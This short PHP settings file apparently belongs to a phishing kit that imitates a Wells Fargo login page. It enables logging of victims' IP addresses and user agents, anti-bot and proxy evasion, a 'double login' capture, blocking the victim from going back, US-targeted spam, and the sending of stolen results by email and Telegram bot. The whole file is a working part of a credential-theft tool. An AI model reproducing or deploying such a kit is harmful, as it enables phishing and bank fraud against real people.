<?php



$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"print_match"	=> "0",	// Print Crawler Detections 
	"anti-back"		=> "1",	// Victim Can't Go Back To Session
	"debug"			=> "0",	// Print Errors
	"proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "1",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"double_login"	=> "1",	// Double Login 
    "email_needed"  => "1",	// email log 
	"telegram"		=> "1",	// Telegram Bots Receiver
	"country"		=> "US", // Target SPAM Country
	"chat_id"		=> "",	// Chat ID Of You
	"bot_url"		=> "bot",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "wellsfargo+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	"email"			=> "",	// Your E-Mail
);
return $settings;



?>